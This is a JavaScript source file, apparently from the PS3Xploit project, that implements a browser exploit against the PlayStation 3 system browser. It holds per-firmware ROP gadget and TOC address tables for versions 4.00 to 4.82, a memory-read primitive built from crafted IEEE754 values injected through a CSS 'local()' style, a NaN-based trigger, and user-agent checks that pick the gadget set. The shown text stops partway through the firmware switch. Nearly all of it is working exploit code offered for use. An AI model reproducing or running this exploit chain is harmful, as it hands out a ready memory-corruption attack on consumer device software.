var debug=false;
var br="<br>";
var hr="<hr>";
var t_out=0;
var total_loops=0;
var max_loops=20;
var sp_exit=0x8FD8DCC0;
var toc_addr=0;
var gadget1_addr=0;
var gadget2_addr=0;
var gadget3_addr=0;
var gadget4_addr=0;
var gadget5_addr=0;
var gadget6_addr=0;
var gadget7_addr=0;
var gadget8_addr=0;
var usb_fp,stack_frame,jump_2,jump_1;
var usb_fp_addr,stack_frame_addr,jump_2_addr,jump_1_addr;
var used_port=0;
var n, y, m, d;
//DEX 4.81
var toc_addr_481_d = 0x705610;
var gadget1_addr_481_d=0x0DEBD8;
var gadget2_addr_481_d=0x0976BC;
var gadget3_addr_481_d=0x6161B8;
var gadget4_addr_481_d=0x1A43FC;
var gadget5_addr_481_d=0x434368;
var gadget6_addr_481_d=0x42B708;
var gadget7_addr_481_d=0x62F814;
var gadget8_addr_481_d=0x2C24DC;
//CEX 4.00
var toc_addr_400 = 0x6E4C20;
var gadget1_addr_400=0x0D8644;
var gadget2_addr_400=0x096EC0;
var gadget3_addr_400=0x5FE0A0;
var gadget4_addr_400=0x196310;
var gadget5_addr_400=0x41F6E0;
var gadget6_addr_400=0x416AE8;
var gadget7_addr_400=0x616250;
var gadget8_addr_400=0x2AA664;

//CEX 4.10
var toc_addr_410 = 0x6E4D50;
var gadget1_addr_410=0x0D8634;
var gadget2_addr_410=0x096EC0;
var gadget3_addr_410=0x600728;
var gadget4_addr_410=0x196994;
var gadget5_addr_410=0x421B18;
var gadget6_addr_410=0x418F20;
var gadget7_addr_410=0x618DF8;
var gadget8_addr_410=0x2ACAE0;

//CEX 4.11
var toc_addr_411 = 0x6E4D50;
var gadget1_addr_411=0x0D8668;
var gadget2_addr_411=0x096EC0;
var gadget3_addr_411=0x600764;
var gadget4_addr_411=0x1969C8;
var gadget5_addr_411=0x421B50;
var gadget6_addr_411=0x418F58;
var gadget7_addr_411=0x618E34;
var gadget8_addr_411=0x2ACB18;

//CEX 4.20
var toc_addr_420 = 0x6F5120;
var gadget1_addr_420=0x0D8FB8;
var gadget2_addr_420=0x0970DC;
var gadget3_addr_420=0x608764;
var gadget4_addr_420=0x19B4C4;
var gadget5_addr_420=0x428304;
var gadget6_addr_420=0x41F70C;
var gadget7_addr_420=0x621D84;
var gadget8_addr_420=0x2B2F8C;

//CEX 4.21
var toc_addr_421 = 0x6F5120;
var gadget1_addr_421=0x0D8F68;
var gadget2_addr_421=0x0970DC;
var gadget3_addr_421=0x608498;
var gadget4_addr_421=0x19B4C4;
var gadget5_addr_421=0x428034;
var gadget6_addr_421=0x41F43C;
var gadget7_addr_421=0x621598;
var gadget8_addr_421=0x2B2F90;

//CEX 4.25
var toc_addr_425 = 0x6F5128;
var gadget1_addr_425=0x0D8FC0;
var gadget2_addr_425=0x0970DC;
var gadget3_addr_425=0x60850C;
var gadget4_addr_425=0x19B4B4;
var gadget5_addr_425=0x42809C;
var gadget6_addr_425=0x41F4A4;
var gadget7_addr_425=0x621B2C;
var gadget8_addr_425=0x2B2FF8;

//CEX 4.30
var toc_addr_430 = 0x6F5220;
var gadget1_addr_430=0x0D95A0;
var gadget2_addr_430=0x09728C;
var gadget3_addr_430=0x609F54;
var gadget4_addr_430=0x19BF94;
var gadget5_addr_430=0x429670;
var gadget6_addr_430=0x420A78;
var gadget7_addr_430=0x623574;
var gadget8_addr_430=0x2B3AA4;

//CEX 4.31
var toc_addr_431 = 0x6F5220;
var gadget1_addr_431=0x0D95A0;
var gadget2_addr_431=0x09728C;
var gadget3_addr_431=0x609F5C;
var gadget4_addr_431=0x19BF94;
var gadget5_addr_431=0x429674;
var gadget6_addr_431=0x420A7C;
var gadget7_addr_431=0x62357C;
var gadget8_addr_431=0x2B3AA8;

//CEX 4.40
var toc_addr_440 = 0x6F5368;
var gadget1_addr_440=0x0D95A8;
var gadget2_addr_440=0x09728C;
var gadget3_addr_440=0x60C31C;
var gadget4_addr_440=0x19C09C;
var gadget5_addr_440=0x42B700;
var gadget6_addr_440=0x422B08;
var gadget7_addr_440=0x62593C;
var gadget8_addr_440=0x2B4A40;

//CEX 4.41
var toc_addr_441 = 0x6F5368;
var gadget1_addr_441=0x0D95A8;
var gadget2_addr_441=0x09728C;
var gadget3_addr_441=0x60C324;
var gadget4_addr_441=0x19C09C;
var gadget5_addr_441=0x42B704;
var gadget6_addr_441=0x422B0C;
var gadget7_addr_441=0x625424;
var gadget8_addr_441=0x2B4A44;

//CEX 4.45
var toc_addr_445 = 0x6F5630;
var gadget1_addr_445=0x0D95A8;
var gadget2_addr_445=0x09728C;
var gadget3_addr_445=0x60CF3C;
var gadget4_addr_445=0x19C09C;
var gadget5_addr_445=0x42C30C;
var gadget6_addr_445=0x423714;
var gadget7_addr_445=0x62603C;
var gadget8_addr_445=0x2B5720;

//CEX 4.46
var toc_addr_446 = 0x6F5630;
var gadget1_addr_446=0x0D95A8;
var gadget2_addr_446=0x09728C;
var gadget3_addr_446=0x60CF3C;
var gadget4_addr_446=0x19C09C;
var gadget5_addr_446=0x42C30C;
var gadget6_addr_446=0x423714;
var gadget7_addr_446=0x62655C;
var gadget8_addr_446=0x2B5720;

//CEX 4.50
var toc_addr_450 = 0x6F5CB0;
var gadget1_addr_450=0x0D9484;
var gadget2_addr_450=0x09732C;
var gadget3_addr_450=0x60C380;
var gadget4_addr_450=0x19C2D0;
var gadget5_addr_450=0x42B514;
var gadget6_addr_450=0x42291C;
var gadget7_addr_450=0x6254BC;
var gadget8_addr_450=0x2B6E84;

//CEX 4.53
var toc_addr_453 = 0x6F5CC8;
var gadget1_addr_453=0x0D94A0;
var gadget2_addr_453=0x09732C;
var gadget3_addr_453=0x60C768;
var gadget4_addr_453=0x19C300;
var gadget5_addr_453=0x42B898;
var gadget6_addr_453=0x422CA0;
var gadget7_addr_453=0x6258A4;
var gadget8_addr_453=0x2B7160;

//CEX 4.55
var toc_addr_455 = 0x6F5CC8;
var gadget1_addr_455=0x0D9450;
var gadget2_addr_455=0x09732C;
var gadget3_addr_455=0x60D554;
var gadget4_addr_455=0x19C300;
var gadget5_addr_455=0x42C684;
var gadget6_addr_455=0x423A8C;
var gadget7_addr_455=0x626690;
var gadget8_addr_455=0x2B7F4C;

//CEX 4.60
var toc_addr_460 = 0x6F5DA8;
var gadget1_addr_460=0x0D9468;
var gadget2_addr_460=0x0972E4;
var gadget3_addr_460=0x611094;
var gadget4_addr_460=0x19D0BC;
var gadget5_addr_460=0x42E368;
var gadget6_addr_460=0x425708;
var gadget7_addr_460=0x62A1D0;
var gadget8_addr_460=0x2B9680;

//CEX 4.65
var toc_addr_465 = 0x6F5DB0;
var gadget1_addr_465=0x0D9468;
var gadget2_addr_465=0x0972E4;
var gadget3_addr_465=0x6110F4;
var gadget4_addr_465=0x19D114;
var gadget5_addr_465=0x42E3C4;
var gadget6_addr_465=0x425764;
var gadget7_addr_465=0x62A750;
var gadget8_addr_465=0x2B96DC;

//CEX 4.66-->
var toc_addr_466 = 0x6F5DC0;
var gadget1_addr_466=0x0D9468;
var gadget2_addr_466=0x0972E4;
var gadget3_addr_466=0x611414;
var gadget4_addr_466=0x19D114;
var gadget5_addr_466=0x42E3C4;
var gadget6_addr_466=0x425764;
var gadget7_addr_466=0x62A550;
var gadget8_addr_466=0x2B96DC;

//CEX 4.70
var toc_addr_470 = 0x6F5E30;
var gadget1_addr_470=0x0D9364;
var gadget2_addr_470=0x0972E4;
var gadget3_addr_470=0x611F84;
var gadget4_addr_470=0x19D07C;
var gadget5_addr_470=0x42EBCC;
var gadget6_addr_470=0x425F6C;
var gadget7_addr_470=0x62B5E0;
var gadget8_addr_470=0x2B9EB4;

//CEX 4.75
var toc_addr_475 = 0x6F57E8;
var gadget1_addr_475=0x0D9364;
var gadget2_addr_475=0x0972E4;
var gadget3_addr_475=0x6107E4;
var gadget4_addr_475=0x19D078;
var gadget5_addr_475=0x42F188;
var gadget6_addr_475=0x426528;
var gadget7_addr_475=0x629E40;
var gadget8_addr_475=0x2BA470;

//CEX 4.76
var toc_addr_476 = 0x6F57E8;
var gadget1_addr_476=0x0D9364;
var gadget2_addr_476=0x0972E4;
var gadget3_addr_476=0x6107E4;
var gadget4_addr_476=0x19D078;
var gadget5_addr_476=0x42F188;
var gadget6_addr_476=0x426528;
var gadget7_addr_476=0x629E40;
var gadget8_addr_476=0x2BA470;

//CEX 4.78
var toc_addr_478 = 0x6F5780;
var gadget1_addr_478=0x0D9364;
var gadget2_addr_478=0x0972E4;
var gadget3_addr_478=0x60DAE0;
var gadget4_addr_478=0x19D078;
var gadget5_addr_478=0x42C3F8;
var gadget6_addr_478=0x423798;
var gadget7_addr_478=0x62713C;
var gadget8_addr_478=0x2BA968;

//CEX 4.80
var toc_addr_480 = 0x6F5520;
var gadget1_addr_480=0x0D9684;
var gadget2_addr_480=0x097604;
var gadget3_addr_480=0x60E588;
var gadget4_addr_480=0x19D3B0;
var gadget5_addr_480=0x42C780;
var gadget6_addr_480=0x423B20;
var gadget7_addr_480=0x627BE4;
var gadget8_addr_480=0x2BACB0;

//CEX 4.81
var toc_addr_481 = 0x6F5520;
var gadget1_addr_481=0x0D9684;
var gadget2_addr_481=0x097604;
var gadget3_addr_481=0x60E59C;
var gadget4_addr_481=0x19D3B0;
var gadget5_addr_481=0x42C774;
var gadget6_addr_481=0x423B14;
var gadget7_addr_481=0x627BF8;
var gadget8_addr_481=0x2BACB4;

//CEX 4.82
var toc_addr_482 = 0x6F5550;
var gadget1_addr_482=0x0D9684;
var gadget2_addr_482=0x097604;
var gadget3_addr_482=0x60EF38;
var gadget4_addr_482=0x19D3B0;
var gadget5_addr_482=0x42C778;
var gadget6_addr_482=0x423B18;
var gadget7_addr_482=0x628594;
var gadget8_addr_482=0x2BACB8;

function asciiAt(str, i){
	return str.charCodeAt(i)&0xFF;
}
function str2ascii(str){
	var ascii = "";
	var i = 0;
	for (; i < str.length; i++){ascii += str.charCodeAt(i).toString(16);}
	return ascii;
}
function hexh2bin(hex_val)
{
return String.fromCharCode(hex_val);

}
function hexw2bin(hex_val)
{
	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}
function s2hex(str){
	var hex = [];
	var  i = 0;
    for (;i < str.length; i++) {
		hex.push(hex16(str.charCodeAt(i).toString(16)));
    }
	return hex.join("");
}
function hex32(s){
	return ('00000000' + s).substr(-8);
}
function hex16(s){
	return ('0000' + s).substr(-4)
}
function hex8(s){
	return ('00' + s).substr(-2);
}
function convertString(str) {
	var asciistr = str2ascii(str);
	if((asciistr.length%4)!=0)asciistr+='00';
	var asciichr;
    var ret = [];
    var i;
    var len;
    for(i = 0, len = asciistr.length; i < len; i += 4) {
	   asciichr = asciistr.substr(i, 4);
       ret.push(String.fromCharCode(parseInt(asciichr, 16)));
    }
    return ret.join('');
}
function sleep(milliseconds){
	var start = new Date().getTime();
	for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds)break;
	}
}
function logAdd(txt)
{
	if(debug===true)
	{
		if(document.getElementById('log').innerHTML==="")setInnerHTML(document.getElementById('log'),hr);
		addInnerHTML(document.getElementById('log'),txt + br); 
	}
}
function clearLogEntry()
{
	setInnerHTML(document.getElementById('log'),"");
}
function writeEnvInfo()
{
	setInnerHTML(document.getElementById('footer'),hr+"<h3>PS3 System Browser Info:</h3>"+navigator.userAgent+br+navigator.appName+" (" + navigator.platform + ")"+br+new Date().toTimeString() + br);
}
function setCharAt(str,index,chr)
{
	if(index > str.length-1) return str;
	return str.substr(0,index) + chr + str.substr(index+1);
}
String.prototype.replaceAt=function(index, ch)
{
	return this.substr(0, index) + ch + this.substr(index+ch.length);
}

//#########################################################################################################################################################################

Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber = 0;
	var bits = [];
	for (var i = bytes.length; i; i -= 1)
	{
		var byte = bytes[i - 1];
		for (var j = 8; j; j -= 1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(address, size)
{
	if(document.getElementById('exploit'))document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";
	else logAdd("Malformed HTML!");
}
function checkMemory(address, size, len)
{
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		if((debug===true))
		{
			var x=document.getElementById('exploit').style.src.substr(6,len);
			logAdd("checkMemory: "+s2hex(x));
			return x;
		}
		return document.getElementById('exploit').style.src.substr(6,len);
	}
	else logAdd("Malformed HTML!");
}

function trigger(exploit_addr){
	if(document.getElementById('trigger'))document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
	else logAdd("Malformed HTML!");
}

//####################################################################################################################################################################
function success(str)
{
	// operations to execute on ROP exit
	showResult(str);
}
function setInnerHTML(elem,str)
{
	if(elem)elem.innerHTML=str;
}
function addInnerHTML(elem,str)
{
	if(elem)elem.innerHTML+=str;
}
function setVisible(elem)
{
	if(elem)elem.style.visibility='visible';
}
function setInvisible(elem)
{
	if(elem)elem.style.visibility='hidden';
}
function enable_element(elem)
{
	if(elem)elem.disabled=false;
}
function disable_element(elem)
{
	if(elem)elem.disabled=true;
}
function cbcheck(elem)
{
	if(elem)elem.checked=true;
}
function cbuncheck(elem)
{
	if(elem)elem.checked=false;
}
function enable_trigger()
{
	enable_element(document.getElementById('btnTrigger'));
	enable_element(document.getElementById('btnReset'));
	enable_element(document.getElementById('dex'));
	
}
function resetOptions(cleanResult)
{
	cbcheck(document.getElementById('usb0'));
	cbuncheck(document.getElementById('usb1'));
	cbuncheck(document.getElementById('usb6'));
	cbuncheck(document.getElementById('sd'));
	cbuncheck(document.getElementById('cf'));
	cbuncheck(document.getElementById('ms'));
	if(cleanResult==true)setInnerHTML(document.getElementById('result'),"");
	cleanGUI();
	used_port=0;
}
function cleanGUI()
{
	enable_cb();
	enable_btn();
	disable_element(document.getElementById('btnTrigger'));
	setInnerHTML(document.getElementById('step2'),"<h3><b>Wait for the exploit initialization to succeed...</b></h3>");
	setInnerHTML(document.getElementById('log'),"");
	t_out=0;
	total_loops=0;
}
function disable_cb()
{
	disable_element(document.getElementById('usb0'));
	disable_element(document.getElementById('usb1'));
	disable_element(document.getElementById('usb6'));
	disable_element(document.getElementById('sd'));
	disable_element(document.getElementById('cf'));
	disable_element(document.getElementById('ms'));
	disable_element(document.getElementById('dex'));
}
function enable_cb()
{
	enable_element(document.getElementById('usb0'));
	enable_element(document.getElementById('usb1'));
	enable_element(document.getElementById('usb6'));
	enable_element(document.getElementById('sd'));
	enable_element(document.getElementById('cf'));
	enable_element(document.getElementById('ms'));
	enable_element(document.getElementById('dex'));
}
function disable_btn()
{
	disable_element(document.getElementById('btnROP'));
	disable_element(document.getElementById('btnReset'));
	disable_element(document.getElementById('btnTrigger'));
	disable_element(document.getElementById('btnRopNor'));
	disable_element(document.getElementById('btnRopNand'));
	disable_element(document.getElementById('btnRopemmc'));
}
function enable_btn()
{
	enable_element(document.getElementById('btnROP'));
	enable_element(document.getElementById('btnReset'));
	enable_element(document.getElementById('btnTrigger'));
	enable_element(document.getElementById('btnRopNor'));
	enable_element(document.getElementById('btnRopNand'));
	enable_element(document.getElementById('btnRopemmc'));
}
function usb(port)
{
	var usb_0=null, usb_1=null, usb_6=null, sd_0=null, cf_0=null, ms_0=null;
	if(document.getElementById('usb0'))usb_0=document.getElementById('usb0');
	if(document.getElementById('usb1'))usb_1=document.getElementById('usb1');
	if(document.getElementById('usb6'))usb_6=document.getElementById('usb6');
	if(document.getElementById('sd'))sd_0=document.getElementById('sd');
	if(document.getElementById('cf'))cf_0=document.getElementById('cf');
	if(document.getElementById('ms'))ms_0=document.getElementById('ms');
	if((usb_0!==null)&&(usb_1!==null)&&(usb_6!==null)&&(sd_0!==null)&&(cf_0!==null)&&(ms_0!==null))
	{
		if((sd_0.checked===false)&&(cf_0.checked===false)&&(ms_0.checked===false)&&(usb_0.checked===false)&&(usb_1.checked===false)&&(usb_6.checked===false)){usb_0.checked=true;port=0;}
	}
	else if((usb_0!==null)&&(usb_1!==null)&&(usb_6!==null))
	{
		if((usb_0.checked===false)&&(usb_1.checked===false)&&(usb_6.checked===false)){usb_0.checked=true;port=0;}
	}
	else 
	{
		logAdd("Malformed HTML checkbox options!");
		return;
	}
	
	switch (port){
	case 1:
			used_port=1;
			cbuncheck(usb_0);
			cbuncheck(usb_6);
			cbuncheck(sd_0);
			cbuncheck(cf_0);
			cbuncheck(ms_0);
			
			break;
	case 6:
			used_port=6;
			cbuncheck(usb_0);
			cbuncheck(usb_1);
			cbuncheck(sd_0);
			cbuncheck(cf_0);
			cbuncheck(ms_0);
			break;
			
	case 1000:
			used_port=1000;
			cbuncheck(usb_0);
			cbuncheck(usb_1);
			cbuncheck(usb_6);
			cbuncheck(cf_0);
			cbuncheck(ms_0);
			break;
	case 1001:
			used_port=1001;
			cbuncheck(usb_0);
			cbuncheck(usb_1);
			cbuncheck(usb_6);
			cbuncheck(sd_0);
			cbuncheck(ms_0);
			break;
	case 1002:
			used_port=1002;
			cbuncheck(usb_0);
			cbuncheck(usb_1);
			cbuncheck(usb_6);
			cbuncheck(sd_0);
			cbuncheck(cf_0);
			break;
	default:
			used_port=0;
			cbuncheck(usb_1);
			cbuncheck(usb_6);
			cbuncheck(sd_0);
			cbuncheck(cf_0);
			cbuncheck(ms_0);
			break;
	}
}
function dex()
{
	if(document.getElementById('dex'))
	{
		if(document.getElementById('dex').checked==true)
		{
			toc_addr = toc_addr_481_d;
			gadget1_addr=gadget1_addr_481_d;
			gadget2_addr=gadget2_addr_481_d;
			gadget3_addr=gadget3_addr_481_d;
			gadget4_addr=gadget4_addr_481_d;
			gadget5_addr=gadget5_addr_481_d;
			gadget6_addr=gadget6_addr_481_d;
			gadget7_addr=gadget7_addr_481_d;
			gadget8_addr=gadget8_addr_481_d;
		}
		else
		{
			toc_addr = toc_addr_481;
			gadget1_addr=gadget1_addr_481;
			gadget2_addr=gadget2_addr_481;
			gadget3_addr=gadget3_addr_481;
			gadget4_addr=gadget4_addr_481;
			gadget5_addr=gadget5_addr_481;
			gadget6_addr=gadget6_addr_481;
			gadget7_addr=gadget7_addr_481;
			gadget8_addr=gadget8_addr_481;
		}
		if(document.getElementById('btnTrigger'))
		{
			if(document.getElementById('btnTrigger').disabled===false)setInnerHTML(document.getElementById('result'),"");
		}
		cleanGUI();
	}
	
}
function initDEX()
{
	if((document.getElementById('dex'))&&(document.getElementById('dex_txt')))
	{
		setVisible(document.getElementById('dex_txt'));
		enable_element(document.getElementById('dex'));
	}
}
function showResult(str)
{
	setInnerHTML(document.getElementById('result'),str);
}
function findJsVariableOffset(name,exploit_data,base,size)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	for (var i=0;i<(dat.length*2);i+=0x10)	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			var match=0;
			for (var k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2))break;
				match+=1;
			}
			if (match===exploit_data.length)
			{
				var exploit_addr=base+i+4;
				logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+br+s2hex(exploit_data));
				return exploit_addr;
			}
		}
	}
	var end_range=base+size;
	logAdd("The string variable named "+name+" could not be located in range 0x"+base.toString(16)+" - 0x"+end_range.toString(16));
	return 0;
}

//####################################################################################################################################################################
function ps3chk(){

	var fwCompat = ["4.00","4.10","4.11","4.20","4.21","4.25","4.30","4.31","4.40","4.41","4.45","4.46","4.50","4.53","4.55","4.60","4.65","4.66","4.70","4.75","4.76","4.78","4.80","4.81","4.82"];
	var ua = navigator.userAgent;
	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
	var msgCongrats = "Congratulations! We've detected your PlayStation 3 is running FW " + fwVersion + ", which is compatible with PS3Xploit! Enjoy!";
	resetOptions();	
	switch (uaStringCheck) {
		case "PLAYSTATION":
			switch (fwVersion) {
				
				case fwCompat[0]:
					alert(msgCongrats);
					toc_addr = toc_addr_400;
					gadget1_addr=gadget1_addr_400;
					gadget2_addr=gadget2_addr_400;
					gadget3_addr=gadget3_addr_400;
					gadget4_addr=gadget4_addr_400;
					gadget5_addr=gadget5_addr_400;
					gadget6_addr=gadget6_addr_400;
					gadget7_addr=gadget7_addr_400;
					gadget8_addr=gadget8_addr_400;
					break;
					
				case fwCompat[1]:
					alert(msgCongrats);
					toc_addr = toc_addr_410;
					gadget1_addr=gadget1_addr_410;
					gadget2_addr=gadget2_addr_410;
					gadget3_addr=gadget3_addr_410;
					gadget4_addr=gadget4_addr_410;
					gadget5_addr=gadget5_addr_410;
					gadget6_addr=gadget6_addr_410;
					gadget7_addr=gadget7_addr_410;
					gadget8_addr=gadget8_addr_410;
					break;
					
				case fwCompat[2]:
					alert(msgCongrats);
					toc_addr = toc_addr_411;
					gadget1_addr=gadget1_addr_411;
					gadget2_addr=gadget2_addr_411;
					gadget3_addr=gadget3_addr_411;
					gadget4_addr=gadget4_addr_411;
					gadget5_addr=gadget5_addr_411;
					gadget6_addr=gadget6_addr_411;
					gadget7_addr=gadget7_addr_411;
					gadget8_addr=gadget8_addr_411;
					break;
					
				case fwCompat[3]:
					alert(msgCongrats);
					toc_addr = toc_addr_420;
					gadget1_addr=gadget1_addr_420;
					gadget2_addr=gadget2_addr_420;
					gadget3_addr=gadget3_addr_420;
					gadget4_addr=gadget4_addr_420;
					gadget5_addr=gadget5_addr_420;
					gadget6_addr=gadget6_addr_420;
					gadget7_addr=gadget7_addr_420;
					gadget8_addr=gadget8_addr_420;
					break;
					
				case fwCompat[4]:
					alert(msgCongrats);
					toc_addr = toc_addr_421;
					gadget1_addr=gadget1_addr_421;
					gadget2_addr=gadget2_addr_421;
					gadget3_addr=gadget3_addr_421;
					gadget4_addr=gadget4_addr_421;
					gadget5_addr=gadget5_addr_421;
					gadget6_addr=gadget6_addr_421;
					gadget7_addr=gadget7_addr_421;
					gadget8_addr=gadget8_addr_421;
					break;
					
				case fwCompat[5]:
					alert(msgCongrats);
					toc_addr = toc_addr_425;
					gadget1_addr=gadget1_addr_425;
					gadget2_addr=gadget2_addr_425;
					gadget3_addr=gadget3_addr_425;
					gadget4_addr=gadget4_addr_425;
					gadget5_addr=gadget5_addr_425;
					gadget6_addr=gadget6_addr_425;
					gadget7_addr=gadget7_addr_425;
					gadget8_addr=gadget8_addr_425;
					break;
					
				case fwCompat[6]:
					alert(msgCongrats);
					toc_addr = toc_addr_430;
					gadget1_addr=gadget1_addr_430;
					gadget2_addr=gadget2_addr_430;
					gadget3_addr=gadget3_addr_430;
					gadget4_addr=gadget4_addr_430;
					gadget5_addr=gadget5_addr_430;
					gadget6_addr=gadget6_addr_430;
					gadget7_addr=gadget7_addr_430;
					gadget8_addr=gadget8_addr_430;
					break;
					
				case fwCompat[7]:
					alert(msgCongrats);
					toc_addr = toc_addr_431;
					gadget1_addr=gadget1_addr_431;
					gadget2_addr=gadget2_addr_431;
					gadget3_addr=gadget3_addr_431;
					gadget4_addr=gadget4_addr_431;
					gadget5_addr=gadget5_addr_431;
					gadget6_addr=gadget6_addr_431;
					gadget7_addr=gadget7_addr_431;
					gadget8_addr=gadget8_addr_431;
					break;
					
				case fwCompat[8]:
					alert(msgCongrats);
					toc_addr = toc_addr_440;
					gadget1_addr=gadget1_addr_440;
					gadget2_addr=gadget2_addr_440;
					gadget3_addr=gadget3_addr_440;
					gadget4_addr=gadget4_addr_440;
					gadget5_addr=gadget5_addr_440;
					gadget6_addr=gadget6_addr_440;
					gadget7_addr=gadget7_addr_440;
					gadget8_addr=gadget8_addr_440;
					break;
					
				case fwCompat[9]:
					alert(msgCongrats);
					toc_addr = toc_addr_441;
					gadget1_addr=gadget1_addr_441;
					gadget2_addr=gadget2_addr_441;
					gadget3_addr=gadget3_addr_441;
					gadget4_addr=gadget4_addr_441;
					gadget5_addr=gadget5_addr_441;
					gadget6_addr=gadget6_addr_441;
					gadget7_addr=gadget7_addr_441;
					gadget8_addr=gadget8_addr_441;
					break;
					
				case fwCompat[10]:
					alert(msgCongrats);
					toc_addr = toc_addr_445;
					gadget1_addr=gadget1_addr_445;
					gadget2_addr=gadget2_addr_445;
					gadget3_addr=gadget3_addr_445;
					gadget4_addr=gadget4_addr_445;
					gadget5_addr=gadget5_addr_445;
					gadget6_addr=gadget6_addr_445;
					gadget7_addr=gadget7_addr_445;
					gadget8_addr=gadget8_addr_445;
					break;
					
				case fwCompat[11]:
					alert(msgCongrats);
					toc_addr = toc_addr_446;
					gadget1_addr=gadget1_addr_446;
					gadget2_addr=gadget2_addr_446;
					gadget3_addr=gadget3_addr_446;
					gadget4_addr=gadget4_addr_446;
					gadget5_addr=gadget5_addr_446;
					gadget6_addr=gadget6_addr_446;
					gadget7_addr=gadget7_addr_446;
					gadget8_addr=gadget8_addr_446;
					break;
					
				case fwCompat[12]:
					alert(msgCongrats);
					toc_addr = toc_addr_450;
					gadget1_addr=gadget1_addr_450;
					gadget2_addr=gadget2_addr_450;
					gadget3_addr=gadget3_addr_450;
					gadget4_addr=gadget4_addr_450;
					gadget5_addr=gadget5_addr_450;
					gadget6_addr=gadget6_addr_450;
					gadget7_addr=gadget7_addr_450;
					gadget8_addr=gadget8_addr_450;
					break;
					
				case fwCompat[13]:
					alert(msgCongrats);
					toc_addr = toc_addr_453;
					gadget1_addr=gadget1_addr_453;
					gadget2_addr=gadget2_addr_453;
					gadget3_addr=gadget3_addr_453;
					gadget4_addr=gadget4_addr_453;
					gadget5_addr=gadget5_addr_453;
					gadget6_addr=gadget6_addr_453;
					gadget7_addr=gadget7_addr_453;
					gadget8_addr=gadget8_addr_453;
					break;
					
				case fwCompat[14]:
					alert(msgCongrats);
					toc_addr = toc_addr_455;
					gadget1_addr=gadget1_addr_455;
					gadget2_addr=gadget2_addr_455;
					gadget3_addr=gadget3_addr_455;
					gadget4_addr=gadget4_addr_455;
					gadget5_addr=gadget5_addr_455;
					gadget6_addr=gadget6_addr_455;
					gadget7_addr=gadget7_addr_455;
					gadget8_addr=gadget8_addr_455;
					break;
					
				case fwCompat[15]:
					alert(msgCongrats);
					toc_addr = toc_addr_460;
					gadget1_addr=gadget1_addr_460;
					gadget2_addr=gadget2_addr_460;
					gadget3_addr=gadget3_addr_460;
					gadget4_addr=gadget4_addr_460;
					gadget5_addr=gadget5_addr_460;
					gadget6_addr=gadget6_addr_460;
					gadget7_addr=gadget7_addr_460;
					gadget8_addr=gadget8_addr_460;
					break;
					
				case fwCompat[16]:
					alert(msgCongrats);
					toc_addr = toc_addr_465;
					gadget1_addr=gadget1_addr_465;
					gadget2_addr=gadget2_addr_465;
					gadget3_addr=gadget3_addr_465;
					gadget4_addr=gadget4_addr_465;
					gadget5_addr=gadget5_addr_465;
					gadget6_addr=gadget6_addr_465;
					gadget7_addr=gadget7_addr_465;
					gadget8_addr=gadget8_addr_465;
					break;
					
				case fwCompat[17]:
					alert(msgCongrats);
					toc_addr = toc_addr_466;
					gadget1_addr=gadget1_addr_466;
					gadget2_addr=gadget2_addr_466;
					gadget3_addr=gadget3_addr_466;
					gadget4_addr=gadget4_addr_466;
					gadget5_addr=gadget5_addr_466;
					gadget6_addr=gadget6_addr_466;
					gadget7_addr=gadget7_addr_466;
					gadget8_addr=gadget8_addr_466;
					break;
					
				case fwCompat[18]:
					alert(msgCongrats);
					toc_addr = toc_addr_470;
					gadget1_addr=gadget1_addr_470;
					gadget2_addr=gadget2_addr_470;
					gadget3_addr=gadget3_addr_470;
					gadget4_addr=gadget4_addr_470;
					gadget5_addr=gadget5_addr_470;
					gadget6_addr=gadget6_addr_470;
					gadget7_addr=gadget7_addr_470;
					gadget8_addr=gadget8_addr_470;
					break;
					
				case fwCompat[19]:
					alert(msgCongrats);
					toc_addr = toc_addr_475;
					gadget1_addr=gadget1_addr_475;
					gadget2_addr=gadget2_addr_475;
					gadget3_addr=gadget3_addr_475;
					gadget4_addr=gadget4_addr_475;
					gadget5_addr=gadget5_addr_475;
					gadget6_addr=gadget6_addr_475;
					gadget7_addr=gadget7_addr_475;
					gadget8_addr=gadget8_addr_475;
					break;
					
